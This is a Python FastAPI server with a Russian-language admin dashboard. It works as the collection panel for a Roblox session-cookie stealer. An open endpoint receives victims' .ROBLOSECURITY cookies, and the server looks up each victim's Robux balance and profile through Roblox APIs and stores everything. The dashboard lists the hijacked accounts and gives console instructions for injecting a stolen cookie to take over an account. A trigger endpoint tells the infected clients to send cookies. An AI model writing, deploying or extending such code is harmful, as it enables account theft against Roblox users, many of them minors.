from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import json, secrets, os, httpx
from datetime import datetime

app = FastAPI()
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "")
SESSIONS = {}
PROFILE = {"username": "Admin", "avatar": "", "bio": ""}
COOKIE_TRIGGER = False

# ─── MongoDB (или файл, если MongoDB нет) ───
MONGO_URL = os.environ.get("MONGO_URL")
USE_MONGO = False
db = None

if MONGO_URL:
    try:
        from pymongo import MongoClient
        client = MongoClient(MONGO_URL)
        db = client.robrain
        db.cookies.create_index("time")
        USE_MONGO = True
        print("Using MongoDB")
    except Exception as e:
        print(f"MongoDB failed: {e}")

DATA_FILE = "data.json"

def get_data():
    if USE_MONGO:
        return list(db.cookies.find({}, {"_id": 0}).sort("time", -1).limit(50))
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE) as f: return json.load(f).get("cookies", [])
    return []

def save_cookie(entry):
    if USE_MONGO:
        db.cookies.insert_one(entry)
    else:
        d = {"cookies": get_data() + [entry]}
        with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

def delete_cookie(idx):
    if USE_MONGO:
        c = list(db.cookies.find({}, {"_id": 1}).sort("time", -1).limit(50))
        if idx < len(c):
            db.cookies.delete_one({"_id": c[idx]["_id"]})
    else:
        d = {"cookies": get_data()}
        if idx < len(d["cookies"]):
            d["cookies"].pop(idx)
            with open(DATA_FILE, "w") as f: json.dump(d, f, indent=2)

class CookieData(BaseModel):
    cookie: str; username: str; browser: str = "Chrome"; timestamp: str = ""

async def fetch_profile(cookie: str):
    try:
        async with httpx.AsyncClient() as client:
            r = await client.get("https://users.roblox.com/v1/users/authenticated",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            if r.status_code != 200: return {}
            data = r.json()
            uid = data.get("id")
            name = data.get("name", "")
            display = data.get("displayName", "")

            r2 = await client.get(f"https://economy.roblox.com/v1/users/{uid}/currency",
                headers={"Cookie": f".ROBLOSECURITY={cookie}"}, timeout=10)
            robux = r2.json().get("robux", 0) if r2.status_code == 200 else 0

            r3 = await client.get(
                f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=60x60&format=Png",
                timeout=10)
            avatar = ""
            if r3.status_code == 200:
                d = r3.json().get("data", [])
                if d: avatar = d[0].get("imageUrl", "")

            return {"username": name, "display": display, "robux": robux, "avatar": avatar, "id": uid}
    except: return {}

def require_session(request: Request):
    token = request.cookies.get("session")
    if not token or token not in SESSIONS: raise HTTPException(401, "Unauthorized")
    return SESSIONS[token]

@app.get("/api/check-auth")
async def check_auth(request: Request):
    try:
        require_session(request)
        return {"authenticated": True, "theme": "purple", **PROFILE}
    except: return JSONResponse({"authenticated": False}, status_code=401)

@app.post("/api/login")
async def login(request: Request):
    body = await request.json()
    if body.get("password") == ADMIN_PASSWORD:
        token = secrets.token_hex(32)
        SESSIONS[token] = {"username": "Admin"}
        resp = JSONResponse({"ok": True})
        resp.set_cookie("session", token, httponly=True, samesite="strict", max_age=86400*7)
        return resp
    raise HTTPException(403, "Wrong password")

@app.post("/api/logout")
async def logout(request: Request):
    token = request.cookies.get("session")
    if token: SESSIONS.pop(token, None)
    resp = JSONResponse({"ok": True})
    resp.delete_cookie("session")
    return resp

@app.post("/api/cookie")
async def receive_cookie(c: CookieData):
    prof = await fetch_profile(c.cookie)
    entry = {
        "time": c.timestamp or datetime.utcnow().isoformat(),
        "username": prof.get("display") or c.username,
        "cookie": c.cookie, "browser": c.browser,
        "robux": prof.get("robux", 0),
        "avatar": prof.get("avatar", ""),
        "roblox_user": prof.get("username", ""),
        "roblox_id": prof.get("id", 0),
    }
    save_cookie(entry)
    return {"status": "ok", "total": 0, "robux": entry["robux"]}

@app.get("/api/cookies")
async def get_cookies(session=Depends(require_session)):
    return get_data()

@app.delete("/api/cookies/{idx}")
async def remove_cookie(idx: int, session=Depends(require_session)):
    delete_cookie(idx)
    return {"ok": True}

@app.post("/api/settings")
async def save_settings(request: Request, session=Depends(require_session)):
    body = await request.json()
    if "username" in body: PROFILE["username"] = body["username"]
    if "avatar" in body: PROFILE["avatar"] = body["avatar"]
    if "bio" in body: PROFILE["bio"] = body["bio"]
    return {"ok": True}

@app.post("/api/trigger-cookies")
async def trigger_cookies(session=Depends(require_session)):
    global COOKIE_TRIGGER
    COOKIE_TRIGGER = True
    return {"ok": True}

@app.get("/api/trigger-check")
async def trigger_check():
    global COOKIE_TRIGGER
    if COOKIE_TRIGGER:
        COOKIE_TRIGGER = False
        return {"trigger": True}
    return {"trigger": False}

@app.get("/api/settings")
async def get_settings(session=Depends(require_session)):
    return {"theme": "purple", **PROFILE}

HTML = r"""
<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>NEXUS — Приборная панель</title>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Fira+Code:wght@400;500;600&display=swap" rel="stylesheet">
  <style>
/* CSS based on NEXUS Pro Max Glassmorphism */
:root {
  --bg-color: #030306;
  --bg-gradient: radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.06) 0%, transparent 40%),
                 radial-gradient(circle at 90% 80%, rgba(255, 0, 127, 0.05) 0%, transparent 40%),
                 #030306;
  --surface: rgba(10, 10, 16, 0.6);
  --surface-solid: #09090e;
  --surface-hover: rgba(18, 18, 28, 0.85);
  --surface-active: rgba(28, 28, 40, 0.95);
  --border: rgba(255, 255, 255, 0.05);
  --border-glow: rgba(0, 240, 255, 0.3);
  --border-hover: rgba(255, 255, 255, 0.15);
  --accent: #00f0ff; 
  --accent-secondary: #ff007f; 
  --accent-soft: rgba(0, 240, 255, 0.12);
  --accent-glow: rgba(0, 240, 255, 0.25);
  --accent-text: #7efff5;
  --text: #f1f5f9;
  --text-secondary: #94a3b8;
  --text-muted: #475569;
  --success: #00ff88; 
  --danger: #ff0055; 
  --warning: #ff9f1c; 
  --gold: #ffd60a;
  --radius-sm: 12px;
  --radius-md: 18px;
  --radius-lg: 24px;
  --radius-xl: 32px;
  --shadow-base: 0 10px 40px -10px rgba(0, 0, 0, 0.7);
  --shadow-glow: 0 0 25px var(--accent-glow);
  --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
  --transition-slow: all 0.5s cubic-bezier(0.25, 0.8, 0.25, 1);
  --transition-bounce: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
}
*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
html { scroll-behavior: smooth; font-size: 13px; }
body {
  font-family: 'Outfit', sans-serif;
  background-color: var(--bg-color);
  background-image: var(--bg-gradient);
  background-attachment: fixed;
  color: var(--text);
  min-height: 100vh;
  overflow-x: hidden;
  line-height: 1.6;
  -webkit-font-smoothing: antialiased;
  display: flex;
}
body::before {
  content: '';
  position: fixed;
  inset: 0;
  background: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.03'/%3E%3C/svg%3E");
  z-index: -1;
  pointer-events: none;
}
::-webkit-scrollbar { width: 6px; height: 6px; }
::-webkit-scrollbar-track { background: transparent; }
::-webkit-scrollbar-thumb { background: rgba(255, 255, 255, 0.1); border-radius: 10px; }
::-webkit-scrollbar-thumb:hover { background: var(--accent); }
::selection { background: var(--accent); color: #fff; }

.sidebar-layout { display: flex; width: 100vw; height: 100vh; height: 100dvh; overflow: hidden; }
.sidebar {
  width: 280px; height: 100%;
  background: rgba(15, 17, 26, 0.5); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px);
  border-right: 1px solid rgba(255, 255, 255, 0.08);
  display: flex; flex-direction: column; padding: 2rem 1.5rem; z-index: 100; transition: var(--transition); position: relative;
}
.sidebar::after {
  content: ''; position: absolute; top: 0; right: 0; width: 1px; height: 100%;
  background: linear-gradient(to bottom, transparent, var(--accent), transparent); opacity: 0.3;
}
.main-content { flex: 1; height: 100%; overflow-y: auto; padding: 2rem 3rem; position: relative; }
.logo { display: flex; align-items: center; justify-content: center; gap: 15px; font-size: 1.8rem; font-weight: 800; letter-spacing: 2px; color: var(--text); margin-bottom: 3rem; text-transform: uppercase; }
.logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; box-shadow: 0 0 20px var(--accent-glow); animation: pulse-glow 3s infinite alternate; }
@keyframes pulse-glow { 0% { box-shadow: 0 0 15px var(--accent-glow); } 100% { box-shadow: 0 0 30px var(--accent); } }
.nav-links { display: flex; flex-direction: column; gap: 12px; }
.nav-link { color: var(--text-secondary); text-decoration: none; font-size: 0.95rem; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; padding: 1rem 1.2rem; border-radius: 12px; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: flex-start; padding-left: 2rem; gap: 12px; position: relative; overflow: hidden; border: 1px solid transparent; cursor: pointer; }
.nav-icon { display: flex; align-items: center; justify-content: center; }
.nav-icon svg { width: 20px; height: 20px; }
.nav-link:hover { color: var(--text); background: rgba(255, 255, 255, 0.03); border-color: rgba(255, 255, 255, 0.05); }
.nav-link.active { color: #fff; background: var(--accent-soft); border: 1px solid var(--accent-glow); font-weight: 700; box-shadow: 0 0 20px var(--accent-glow); }
.user-badge { display: flex; align-items: center; gap: 14px; padding: 1rem 1.2rem; background: transparent; border: none; border-radius: 16px; margin-top: auto; transition: all 0.3s ease; }
.user-badge:hover { background: rgba(255, 255, 255, 0.02); }
.user-avatar { font-size: 1.5rem; width: 42px; height: 42px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, rgba(255,255,255,0.05), rgba(255,255,255,0.01)); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; color: #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.2); overflow:hidden;}
.user-avatar img { width: 100%; height: 100%; border-radius: 12px; object-fit: cover; }
.user-info { display: flex; flex-direction: column; flex: 1; gap: 4px; }
.user-name { font-size: 0.95rem; font-weight: 600; color: var(--text); letter-spacing: 0.5px; }
.btn-logout { background: transparent; color: var(--danger); border: none; font-size: 0.8rem; font-weight: 500; text-align: left; padding: 0; cursor: pointer; transition: var(--transition); opacity: 0.8; }
.btn-logout:hover { opacity: 1; text-shadow: 0 0 8px var(--danger); }
.top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 2rem; animation: slideDown 0.6s ease-out; }
.page-title { font-size: 2.5rem; font-weight: 800; background: linear-gradient(135deg, #fff, var(--text-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
@keyframes slideDown { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
.stats-bar { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.25rem; margin-bottom: 2rem; }
.stat-card { background: var(--surface); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid var(--border); border-radius: var(--radius-xl); padding: 1.5rem; position: relative; overflow: hidden; transition: var(--transition-bounce); animation: fadeInUp 0.5s backwards; display: flex; flex-direction: column; justify-content: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
@keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
.stat-card:hover { border-color: var(--border-glow); transform: translateY(-4px) scale(1.02); box-shadow: var(--shadow-glow); background: var(--surface-hover); }
.stat-label { font-size: 0.75rem; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }
.stat-value { font-size: 1.8rem; font-weight: 800; color: var(--text); }
.stat-value.accent { background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
.controls-panel { display: flex; gap: 1rem; align-items: center; justify-content: space-between; margin-bottom: 2rem; background: var(--surface); backdrop-filter: blur(10px); padding: 1rem; border-radius: var(--radius-lg); border: 1px solid var(--border); animation: fadeIn 0.8s ease backwards 0.3s; }
@keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
.btn-refresh, .btn-submit, .modal-btn { background: linear-gradient(135deg, var(--surface-hover), var(--surface-active)); border: 1px solid var(--border); color: var(--text); padding: 0.8rem 1.8rem; border-radius: var(--radius-lg); font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.2); position: relative; overflow: hidden; }
.btn-refresh::after, .btn-submit::after, .modal-btn::after { content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%; background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent); transform: skewX(-20deg); transition: 0.5s; }
.btn-refresh:hover::after, .btn-submit:hover::after, .modal-btn:hover::after { left: 150%; }
.btn-refresh:hover, .btn-submit:hover, .modal-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px var(--accent-glow); }
.tokens-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 1.5rem; }
.token-card { background: rgba(15, 23, 42, 0.6); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: var(--radius-lg); overflow: hidden; position: relative; transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1); cursor: pointer; animation: zoomIn 0.5s backwards; padding: 1.5rem; display: flex; flex-direction: column; align-items: center; }
@keyframes zoomIn { from { opacity:0; transform:scale(0.95); } to { opacity:1; transform:scale(1); } }
.token-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, var(--accent), transparent); opacity: 0; transition: 0.4s; }
.token-card:hover { transform: translateY(-10px) scale(1.02); border-color: var(--border-hover); box-shadow: 0 15px 40px -5px rgba(0,0,0,0.5), 0 0 20px var(--accent-soft); background: rgba(30, 41, 59, 0.8); }
.token-card:hover::before { opacity: 1; }
.token-card-status { position: absolute; top: 15px; right: 15px; }
.token-card-robux { position: absolute; top: 15px; left: 15px; background: rgba(251, 191, 36, 0.1); color: #fbbf24; padding: 4px 10px; border-radius: 20px; font-weight: 800; font-size: 0.85rem; border: 1px solid rgba(251, 191, 36, 0.3); box-shadow: 0 0 10px rgba(251, 191, 36, 0.2); }
.token-card-avatar { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.05); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin-bottom: 1rem; margin-top: 1.5rem; border: 2px solid rgba(255,255,255,0.1); object-fit:cover; }
.token-card-name { font-size: 1.3rem; font-weight: 800; margin-bottom: 0.5rem; color: #fff; text-align: center; }
.token-card-computer { font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 5px; }
.token-card-actions { width: 100%; display: flex; flex-direction: column; gap: 8px; margin-top: auto; }
.btn-login { background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(16, 185, 129, 0.05)); border: 1px solid rgba(16, 185, 129, 0.3); color: #34d399; width: 100%; padding: 12px; border-radius: 12px; font-weight: 700; font-size: 1rem; cursor: pointer; transition: all 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 8px; }
.btn-login:hover { background: linear-gradient(135deg, rgba(16, 185, 129, 0.3), rgba(16, 185, 129, 0.1)); box-shadow: 0 0 15px rgba(16, 185, 129, 0.2); }
.btn-secondary { background: rgba(255,255,255,0.03); border: 1px solid var(--border); color: var(--text-muted); width: 100%; padding: 8px; border-radius: 8px; font-size: 0.85rem; cursor: pointer; transition: all 0.2s ease; font-family: inherit;}
.btn-secondary:hover { background: rgba(255,255,255,0.08); color: #fff; border-color:var(--danger); color:var(--danger);}

.login-body { display: flex; align-items: center; justify-content: center; height: 100vh; width: 100%; }
.login-card { background: rgba(15, 17, 26, 0.6); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); padding: 3rem 2.5rem; border-radius: var(--radius-xl); width: 100%; max-width: 420px; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 40px var(--accent-glow); text-align: center; animation: scaleUp 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
@keyframes scaleUp { from { transform: scale(0.9); opacity:0; } to { transform: scale(1); opacity: 1;} }
.login-logo { margin-bottom: 2rem; display:flex; flex-direction:column; align-items:center; }
.login-logo-icon { font-size: 3rem; width: 80px; height: 80px; border-radius: 20px; animation: pulse-glow 2s infinite alternate; background: linear-gradient(135deg, var(--accent), var(--accent-secondary)); display:flex; align-items:center; justify-content:center;}
.login-logo-text { font-size: 2rem; font-weight: 900; margin-top: 1rem; letter-spacing: 4px; }
.input-group { margin-bottom: 1.5rem; text-align: left; }
.input-group label { display: block; font-size: 0.9rem; color: var(--text-secondary); margin-bottom: 0.5rem; }
.input-group input, .input-group textarea { width: 100%; padding: 1rem 1.2rem; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.1); border-radius: var(--radius-md); color: white; font-size: 1rem; transition: var(--transition); outline: none; font-family: inherit;}
.input-group input:focus, .input-group textarea:focus { border-color: var(--accent); box-shadow: 0 0 20px var(--accent-soft); }
.btn-submit { width: 100%; font-size: 1.1rem; padding: 1rem; background: linear-gradient(135deg, var(--accent-soft), transparent); border-color: var(--accent); color: var(--accent); cursor: pointer; border: 1px solid var(--accent); border-radius: var(--radius-lg); font-weight: 700; transition: var(--transition);}
.btn-submit:hover { background: var(--accent); color: #000; box-shadow: 0 0 25px var(--accent-glow); }

.modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); z-index: 1000; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: var(--transition); }
.modal-overlay.active { opacity: 1; pointer-events: auto; }
.modal-container { background: var(--bg-color); border: 1px solid var(--border); border-radius: var(--radius-xl); width: 95%; max-width: 500px; padding: 2rem; display: flex; flex-direction: column; transform: scale(0.9); transition: var(--transition-bounce); box-shadow: 0 25px 50px rgba(0,0,0,0.5), 0 0 40px var(--accent-glow); position: relative; }
.modal-overlay.active .modal-container { transform: scale(1); }
.modal-close { position: absolute; top: 1.5rem; right: 1.5rem; background: transparent; border: none; color: var(--text-secondary); font-size: 1.5rem; cursor: pointer; transition: var(--transition); }
.modal-close:hover { color: var(--danger); transform: rotate(90deg); }
.modal-title { font-size: 1.5rem; font-weight: 800; margin-bottom: 1.5rem; text-align: center; color: var(--text); }
.modal-btn { width: 100%; margin-top: 1rem; background: linear-gradient(135deg, var(--surface-hover), var(--surface-active)); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 0.8rem; color: var(--text); font-weight: 700; font-size: 0.95rem; cursor: pointer; transition: var(--transition);}
.modal-btn:hover { background: var(--accent); color: #000; border-color: var(--accent); box-shadow: 0 0 15px var(--accent-glow); }

</style>
</head>
<body>
<div id="app" style="display: contents;"></div>
<script>
const app = document.getElementById('app');
let state = { authenticated: false, cookies: [], profile: {} };

async function api(method, path, body) {
    const opts = { method, headers: {} };
    if (body) { opts.headers['Content-Type'] = 'application/json'; opts.body = JSON.stringify(body); }
    const r = await fetch(path, opts);
    if (r.status === 401) { state.authenticated = false; render(); return null; }
    return r.json();
}

async function init() {
    const auth = await api('GET', '/api/check-auth');
    if (auth && auth.authenticated) {
        state.authenticated = true;
        state.profile = { username: auth.username || 'Admin', avatar: auth.avatar || '', bio: auth.bio || '' };
        const c = await api('GET', '/api/cookies');
        if (c) state.cookies = c;
    }
    render();
}

function render() {
    if (!state.authenticated) {
        app.innerHTML = `
        <div class="login-body">
            <div class="login-card">
                <div class="login-logo">
                    <div class="login-logo-icon">🛡️</div>
                    <div class="login-logo-text">NEXUS</div>
                </div>
                <h1 style="font-size: 1.5rem; margin-bottom: 0.5rem; font-weight: 800;">Вход в систему</h1>
                <div style="color: var(--text-secondary); margin-bottom: 2rem;">Авторизация для управления узлами</div>
                <div class="input-group">
                    <input type="password" id="pwd" placeholder="Пароль" onkeydown="if(event.key==='Enter') login()">
                </div>
                <button class="btn-submit" onclick="login()">Войти</button>
                <div id="login-error" style="color:var(--danger);margin-top:1rem;font-size:0.9rem"></div>
            </div>
        </div>`;
    } else {
        const robuxTotal = state.cookies.reduce((acc, c) => acc + (c.robux || 0), 0);
        
        app.innerHTML = `
        <div class="sidebar-layout">
            <div class="sidebar">
                <div class="logo">
                    <div class="logo-icon">🛡️</div>
                    <span class="logo-text">NEXUS</span>
                </div>
                <div class="nav-links">
                    <a class="nav-link active">
                        <div class="nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="9"></rect><rect x="14" y="3" width="7" height="5"></rect><rect x="14" y="12" width="7" height="9"></rect><rect x="3" y="16" width="7" height="5"></rect></svg></div>
                        <span class="nav-label">Токены</span>
                    </a>
                    <a class="nav-link" onclick="openSettings()">
                        <div class="nav-icon"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg></div>
                        <span class="nav-label">Настройки</span>
                    </a>
                </div>
                <div class="user-badge">
                    <span class="user-avatar">${state.profile.avatar ? '<img src="' + state.profile.avatar + '">' : '👤'}</span>
                    <div class="user-info">
                        <span class="user-name">${state.profile.username || 'Admin'}</span>
                        <button class="btn-logout" onclick="logout()">Выйти</button>
                    </div>
                </div>
            </div>
            
            <div class="main-content">
                <div class="top-bar">
                    <h1 class="page-title">База токенов</h1>
                </div>
                
                <div class="stats-bar">
                    <div class="stat-card">
                        <div class="stat-label">Всего аккаунтов</div>
                        <div class="stat-value accent">${state.cookies.length}</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-label">Рабочих</div>
                        <div class="stat-value" style="color: var(--success)">${state.cookies.length}</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-label">Общий Robux</div>
                        <div class="stat-value" style="color: var(--gold)">${robuxTotal}</div>
                    </div>
                </div>
                
                <div class="controls-panel">
                    <div style="font-size: 1rem; color: var(--text-secondary);">Управление базой данных токенов</div>
                    <div style="display:flex; gap:10px;">
                        <button class="btn-refresh" id="btnRequestAll" style="border-color:rgba(99,102,241,0.2); color:var(--accent);" onclick="requestTokens()">📡 Запросить у всех</button>
                        <button class="btn-refresh" onclick="refreshCookies()">↻ Обновить</button>
                    </div>
                </div>
                
                <div class="tokens-grid" id="cards"></div>
            </div>
            
            <div class="modal-overlay" id="settings-modal">
                <div class="modal-container">
                    <button class="modal-close" onclick="closeSettings()">✕</button>
                    <div class="modal-title">Настройки профиля</div>
                    <div class="input-group">
                        <label>Отображаемое имя</label>
                        <input type="text" id="set-name" value="${state.profile.username || ''}">
                    </div>
                    <div class="input-group">
                        <label>URL Аватарки</label>
                        <input type="text" id="set-avatar" value="${state.profile.avatar || ''}">
                    </div>
                    <div class="input-group">
                        <label>О себе</label>
                        <textarea id="set-bio" rows="3">${state.profile.bio || ''}</textarea>
                    </div>
                    <button class="modal-btn" onclick="saveProfile()">Сохранить изменения</button>
                </div>
            </div>
        </div>`;
        renderCards();
    }
}

function renderCards() {
    const container = document.getElementById('cards');
    if (!container) return;
    if (!state.cookies.length) {
        container.innerHTML = '<div style="grid-column: 1 / -1; text-align: center; padding: 4rem; color: var(--text-secondary); font-size: 1.2rem;">База данных пуста</div>';
        return;
    }
    container.innerHTML = state.cookies.map((c, i) => `
    <div class="token-card">
      <div class="token-card-robux">💰 ${c.robux ?? '?'} R$</div>
      ${c.avatar ? '<img src="' + c.avatar + '" class="token-card-avatar">' : '<div class="token-card-avatar">👤</div>'}
      <div class="token-card-name">${c.username}</div>
      <div class="token-card-computer">@${c.roblox_user || c.username}</div>
      
      <div class="token-card-actions">
        <button class="btn-login" onclick="loginToRoblox('${c.cookie.replace(/'/g, "\\'")}')">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
          Войти
        </button>
        <button class="btn-secondary" onclick="copyText('${c.cookie.replace(/'/g, "\\'")}')">📋 Копировать Cookie</button>
        <button class="btn-secondary" onclick="deleteCookie(${i})">Удалить</button>
      </div>
    </div>`).join('');
}

function copyText(t) {
    navigator.clipboard.writeText(t);
}

function loginToRoblox(cookie) {
    navigator.clipboard.writeText(cookie);
    window.open('https://www.roblox.com/home', '_blank');
    setTimeout(() => {
        alert('Cookie скопирован!\n\n1. Откройте Roblox\n2. Нажмите F12 → Console\n3. Вставьте и нажмите Enter:\n\ndocument.cookie=".ROBLOSECURITY=' + cookie + '; path=/; domain=.roblox.com"\n\n4. Обновите страницу (F5)');
    }, 1000);
}

function openSettings() { document.getElementById('settings-modal').classList.add('active'); }
function closeSettings() { document.getElementById('settings-modal').classList.remove('active'); }

async function saveProfile() {
    const name = document.getElementById('set-name').value;
    const avatar = document.getElementById('set-avatar').value;
    const bio = document.getElementById('set-bio').value;
    const r = await api('POST', '/api/settings', { username: name, avatar, bio });
    if (r) state.profile = { username: name, avatar, bio };
    closeSettings();
    render();
}

async function deleteCookie(i) {
    if(confirm('Удалить аккаунт?')) {
        await api('DELETE', '/api/cookies/' + i);
        state.cookies.splice(i, 1);
        renderCards();
    }
}

async function login() {
    const pwd = document.getElementById('pwd').value;
    const err = document.getElementById('login-error');
    try {
        const r = await api('POST', '/api/login', { password: pwd });
        if (r && r.ok) { state.authenticated = true; init(); }
        else {
            err.textContent = 'Неверный пароль';
            const card = document.querySelector('.login-card');
            card.style.animation = 'none';
            card.offsetHeight;
            card.style.animation = 'scaleUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1)';
        }
    } catch { err.textContent = 'Ошибка сервера'; }
}

async function logout() {
    await api('POST', '/api/logout');
    state.authenticated = false;
    render();
}

async function refreshCookies() {
    const c = await api('GET', '/api/cookies');
    if (c) state.cookies = c;
    renderCards();
}

async function requestTokens() {
    await api('POST', '/api/trigger-cookies');
    const btn = document.getElementById('btnRequestAll');
    if (btn) {
        const oldText = btn.innerHTML;
        btn.innerHTML = 'Запрос отправлен!';
        btn.style.color = 'var(--success)';
        setTimeout(() => { btn.innerHTML = oldText; btn.style.color = 'var(--accent)'; }, 2000);
    }
}

init();
</script>
</body>
</html>
"""

@app.get("/")
async def root():
    return HTMLResponse(HTML)
